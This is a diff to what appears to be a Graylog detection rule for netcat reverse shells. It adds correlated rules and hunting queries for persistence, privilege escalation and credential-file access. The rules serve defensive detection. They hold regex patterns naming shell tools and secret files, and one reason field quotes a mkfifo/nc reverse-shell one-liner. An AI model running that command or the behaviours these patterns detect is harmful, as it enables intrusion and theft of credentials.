@@ -266,23 +266,58 @@ graylog:
   query: (data_process_exec_process_binary:/.*\/[Nn][Cc]/ OR data_process_exec_process_binary:/.*\/[Nn][Cc][Aa][Tt]/) AND (data_process_exec_process_arguments:/.* -[Cc] .*/ OR data_process_exec_process_arguments:/.* -[Ee] .*/) AND (data_process_exec_process_arguments:/.* [Aa][Ss][Hh].*/ OR data_process_exec_process_arguments:/.* [Bb][Aa][Ss][Hh].*/ OR data_process_exec_process_arguments:/.* [Bb][Ss][Hh].*/ OR data_process_exec_process_arguments:/.* [Cc][Ss][Hh].*/ OR data_process_exec_process_arguments:/.* [Kk][Ss][Hh].*/ OR data_process_exec_process_arguments:/.* [Pp][Dd][Kk][Ss][Hh].*/ OR data_process_exec_process_arguments:/.* [Ss][Hh].*/ OR data_process_exec_process_arguments:/.* [Tt][Cc][Ss][Hh].*/ OR data_process_exec_process_arguments:/.*\/[Bb][Ii][Nn]\/[Aa][Ss][Hh].*/ OR data_process_exec_process_arguments:/.*\/[Bb][Ii][Nn]\/[Bb][Aa][Ss][Hh].*/ OR data_process_exec_process_arguments:/.*\/[Bb][Ii][Nn]\/[Bb][Ss][Hh].*/ OR data_process_exec_process_arguments:/.*\/[Bb][Ii][Nn]\/[Cc][Ss][Hh].*/ OR data_process_exec_process_arguments:/.*\/[Bb][Ii][Nn]\/[Kk][Ss][Hh].*/ OR data_process_exec_process_arguments:/.*\/[Bb][Ii][Nn]\/[Pp][Dd][Kk][Ss][Hh].*/ OR data_process_exec_process_arguments:/.*\/[Bb][Ii][Nn]\/[Ss][Hh].*/ OR data_process_exec_process_arguments:/.*\/[Bb][Ii][Nn]\/[Tt][Cc][Ss][Hh].*/ OR data_process_exec_process_arguments:/.*\/[Bb][Ii][Nn]\/[Zz][Ss][Hh].*/ OR data_process_exec_process_arguments:/.*\$[Ii][Ff][Ss][Aa][Ss][Hh].*/ OR data_process_exec_process_arguments:/.*\$[Ii][Ff][Ss][Bb][Aa][Ss][Hh].*/ OR data_process_exec_process_arguments:/.*\$[Ii][Ff][Ss][Bb][Ss][Hh].*/ OR data_process_exec_process_arguments:/.*\$[Ii][Ff][Ss][Cc][Ss][Hh].*/ OR data_process_exec_process_arguments:/.*\$[Ii][Ff][Ss][Kk][Ss][Hh].*/ OR data_process_exec_process_arguments:/.*\$[Ii][Ff][Ss][Pp][Dd][Kk][Ss][Hh].*/ OR data_process_exec_process_arguments:/.*\$[Ii][Ff][Ss][Ss][Hh].*/ OR data_process_exec_process_arguments:/.*\$[Ii][Ff][Ss][Tt][Cc][Ss][Hh].*/ OR data_process_exec_process_arguments:/.*\$[Ii][Ff][Ss][Zz][Ss][Hh].*/)
 
 correlation:
-  # Authored by the correlation engine for review.
+  # Authored per-rule (behaviour-researched) for the correlation engine. Related CoPilot
+  # Searches + telemetry pivots to run around an alert, scoped to its host/user/ip/domain.
+  related_rules:
+  - id: a2d9e2f3-0f43-4c7a-bcd9-9acfc0d723aa
+    name: Suspicious Download and Execute Pattern via Curl/Wget
+    reason: 'Delivery step of the same intrusion: curl/wget pulling a script or binary into /tmp or /dev/shm and running it is the most common way the nc binary or the reverse-shell stager lands on this host just before this fires.'
+  - id: 818f7b24-0fba-4c49-a073-8b755573b9c7
+    name: Linux Webshell Indicators
+    reason: 'Initial-access vector: netcat reverse shells are routinely spawned as a child of httpd/nginx/php after web-app exploitation, so if nc''s parent is a web server this rule exposes the webshell that opened the door.'
+  - id: 999c3b12-0a8c-40b6-8e13-dd7d62b75c7a
+    name: Potentially Suspicious Named Pipe Created Via Mkfifo
+    reason: 'Same technique, different form: the ''mkfifo /tmp/f; cat /tmp/f|/bin/sh|nc <ip> <port> >/tmp/f'' backpipe is the named-pipe variant of a netcat reverse shell, so an mkfifo in /tmp on this host points to the same callback.'
+  - id: 259df6bc-003f-4306-9f54-4ff1a08fa38e
+    name: Potential Perl Reverse Shell Execution
+    reason: 'Sibling one-liner from the same reverse-shell cheat sheet this rule cites (pentestmonkey/revshells): operators try multiple interpreters to get a callback, so a perl -e socket shell on the same host is a parallel attempt at the same C2.'
+  - id: c6714a24-d7d5-4283-a36b-3ffd091d5f7e
+    name: Potential PHP Reverse Shell
+    reason: 'Sibling cheat-sheet one-liner: a php -r fsockopen reverse shell aims at the same callback and is a common fallback when nc is missing or egress is filtered.'
+  - id: 32e62bc7-3de0-4bb1-90af-532978fe42c0
+    name: Python Reverse Shell Execution Via PTY And Socket Modules
+    reason: 'Sibling cheat-sheet one-liner: a python socket+pty reverse shell targets the same callback and is frequently tried alongside or instead of netcat on the same host.'
+  - id: c4042d54-110d-45dd-a0e1-05c47822c937
+    name: Python Spawning Pretty TTY Via PTY Module
+    reason: 'Immediate next step: ''python -c import pty; pty.spawn(/bin/bash)'' is the canonical TTY upgrade an operator runs seconds after a dumb netcat shell to gain a fully interactive session.'
+  - id: 0cf7a157-8879-41a2-8f55-388dd23746b7
+    name: Linux Recon Indicators
+    reason: 'First hands-on-keyboard activity: whoami/id/uname/SUID-find style recon is what an attacker runs the moment the interactive shell this rule grants connects back.'
+  window: 2h
   enrichment_searches:
-  # Rule-specific telemetry pivots the engine runs around an alert from this rule,
-  # scoped to the alert's host/user/IP within the window (behaviour-targeted, not a sweep).
-    - name: "Shell / interpreter execution on this host"
-      query: '((data_process_exec_process_binary:/.*(\/[Bb][Aa][Ss][Hh]|\/[Ss][Hh]|\/[Dd][Aa][Ss][Hh]|\/[Zz][Ss][Hh]|\/[Kk][Ss][Hh]|\/[Aa][Ss][Hh]|\/[Bb][Uu][Ss][Yy][Bb][Oo][Xx])/) OR (data_process_exec_process_binary:/.*(\/[Pp][Yy][Tt][Hh][Oo][Nn]|\/[Pp][Yy][Tt][Hh][Oo][Nn]3|\/[Pp][Ee][Rr][Ll]|\/[Rr][Uu][Bb][Yy]|\/[Pp][Hh][Pp]|\/[Nn][Oo][Dd][Ee]|\/[Ll][Uu][Aa]|\/[Aa][Ww][Kk])/))'
-      pivot_on: [host]
-      window: 1h
-    - name: "Other executions of this tool-set on this host (any arguments)"
-      query: 'data_process_exec_process_binary:/.*(\/[Nn][Cc][Aa][Tt])/'
-      pivot_on: [host]
-      window: 2h
-    - name: "Persistence via cron / systemd / shell profiles on this host"
-      query: '((data_process_exec_process_binary:/.*(\/[Cc][Rr][Oo][Nn][Tt][Aa][Bb]|\/[Ss][Yy][Ss][Tt][Ee][Mm][Cc][Tt][Ll]|\/[Aa][Tt]|\/[Uu][Pp][Dd][Aa][Tt][Ee]-[Rr][Cc]\.[Dd])/) OR (data_process_exec_process_arguments:/.*\/[Ee][Tt][Cc]\/[Cc][Rr][Oo][Nn].*/) OR (data_process_exec_process_arguments:/.*\/[Ee][Tt][Cc]\/[Ss][Yy][Ss][Tt][Ee][Mm][Dd].*/) OR (data_process_exec_process_arguments:/.*[Rr][Cc]\.[Ll][Oo][Cc][Aa][Ll].*/) OR (data_process_exec_process_arguments:/.*\.[Bb][Aa][Ss][Hh][Rr][Cc].*/) OR (data_process_exec_process_arguments:/.*\.[Bb][Aa][Ss][Hh]_[Pp][Rr][Oo][Ff][Ii][Ll][Ee].*/) OR (data_process_exec_process_arguments:/.*\/[Ee][Tt][Cc]\/[Pp][Rr][Oo][Ff][Ii][Ll][Ee].*/) OR (data_process_exec_process_arguments:/.*[Aa][Uu][Tt][Hh][Oo][Rr][Ii][Zz][Ee][Dd]_[Kk][Ee][Yy][Ss].*/) OR (data_process_exec_process_arguments:/.*\/[Ee][Tt][Cc]\/[Ii][Nn][Ii][Tt]\.[Dd].*/))'
-      pivot_on: [host]
-      window: 4h
-    - name: "Reconnaissance commands on this host"
-      query: 'data_process_exec_process_binary:/.*(\/[Ww][Hh][Oo][Aa][Mm][Ii]|\/[Ii][Dd]|\/[Uu][Nn][Aa][Mm][Ee]|\/[Hh][Oo][Ss][Tt][Nn][Aa][Mm][Ee]|\/[Hh][Oo][Ss][Tt][Nn][Aa][Mm][Ee][Cc][Tt][Ll]|\/[Ss][Ss]|\/[Nn][Ee][Tt][Ss][Tt][Aa][Tt]|\/[Ii][Ff][Cc][Oo][Nn][Ff][Ii][Gg]|\/[Aa][Rr][Pp]|\/[Ww]|\/[Ww][Hh][Oo]|\/[Ll][Aa][Ss][Tt]|\/[Ll][Ss][Oo][Ff]|\/[Nn][Mm][Aa][Pp]|\/[Dd][Ii][Gg]|\/[Ff][Ii][Nn][Dd])/'
-      pivot_on: [host]
-      window: 1h
+  # Behaviour-targeted hunts the engine runs around the alert (not a sweep).
+  - name: 'Reverse shell lineage: launched by a web/app server or run from a world-writable directory'
+    query: ((data_process_exec_parent_binary:/.*\/([Hh][Tt][Tt][Pp][Dd]|[Aa][Pp][Aa][Cc][Hh][Ee]2|[Nn][Gg][Ii][Nn][Xx]|[Ll][Ii][Gg][Hh][Tt][Tt][Pp][Dd]|[Pp][Hh][Pp]).*/) OR (data_process_exec_process_binary:/\/([Tt][Mm][Pp]|[Vv][Aa][Rr]\/[Tt][Mm][Pp]|[Dd][Ee][Vv]\/[Ss][Hh][Mm])\/.*/))
+    pivot_on:
+    - host
+    window: 4h
+  - name: Other TCP/pipe reverse or pivot shells on this host (bash /dev/tcp, socat)
+    query: ((data_process_exec_process_arguments:/.*\/[Dd][Ee][Vv]\/([Tt][Cc][Pp]|[Uu][Dd][Pp])\/.*/) OR (data_process_exec_process_binary:/.*\/[Ss][Oo][Cc][Aa][Tt]/))
+    pivot_on:
+    - host
+    window: 2h
+  - name: Local privilege-escalation attempts on this host
+    query: ((data_process_exec_process_binary:/.*\/[Pp][Kk][Ee][Xx][Ee][Cc]/) OR (data_process_exec_process_binary:/.*\/[Ff][Ii][Nn][Dd]/ AND data_process_exec_process_arguments:/.*-[Pp][Ee][Rr][Mm].*/) OR (data_process_exec_process_arguments:/.*\/[Ee][Tt][Cc]\/[Ss][Hh][Aa][Dd][Oo][Ww].*/) OR (data_process_exec_process_binary:/.*\/[Cc][Hh][Mm][Oo][Dd]/ AND data_process_exec_process_arguments:/.*[Uu]\+[Ss].*/))
+    pivot_on:
+    - host
+    window: 2h
+  - name: Persistence establishment on this host (cron, systemd, SSH keys, rc.local, shell profiles)
+    query: ((data_process_exec_process_binary:/.*\/[Cc][Rr][Oo][Nn][Tt][Aa][Bb]/) OR (data_process_exec_process_arguments:/.*\/([Ee][Tt][Cc]\/[Cc][Rr][Oo][Nn]|[Vv][Aa][Rr]\/[Ss][Pp][Oo][Oo][Ll]\/[Cc][Rr][Oo][Nn]).*/) OR (data_process_exec_process_arguments:/.*[Aa][Uu][Tt][Hh][Oo][Rr][Ii][Zz][Ee][Dd]_[Kk][Ee][Yy][Ss].*/) OR (data_process_exec_process_arguments:/.*\/[Ee][Tt][Cc]\/([Ss][Yy][Ss][Tt][Ee][Mm][Dd]|[Rr][Cc]\.[Ll][Oo][Cc][Aa][Ll]|[Ii][Nn][Ii][Tt]\.[Dd]).*/) OR (data_process_exec_process_arguments:/.*\.([Bb][Aa][Ss][Hh][Rr][Cc]|[Bb][Aa][Ss][Hh]_[Pp][Rr][Oo][Ff][Ii][Ll][Ee]|[Pp][Rr][Oo][Ff][Ii][Ll][Ee]).*/))
+    pivot_on:
+    - host
+    window: 6h
+  - name: Credential and sensitive-file access on this host (SSH keys, cloud creds, history, passwd)
+    query: ((data_process_exec_process_arguments:/.*\/\.[Ss][Ss][Hh]\/.*/) OR (data_process_exec_process_arguments:/.*[Ii][Dd]_([Rr][Ss][Aa]|[Ee][Dd]25519|[Dd][Ss][Aa]|[Ee][Cc][Dd][Ss][Aa]).*/) OR (data_process_exec_process_arguments:/.*\/\.[Aa][Ww][Ss]\/[Cc][Rr][Ee][Dd][Ee][Nn][Tt][Ii][Aa][Ll][Ss].*/) OR (data_process_exec_process_arguments:/.*\.[Bb][Aa][Ss][Hh]_[Hh][Ii][Ss][Tt][Oo][Rr][Yy].*/) OR (data_process_exec_process_arguments:/.*\/[Ee][Tt][Cc]\/[Pp][Aa][Ss][Ss][Ww][Dd].*/))
+    pivot_on:
+    - host
+    window: 2h
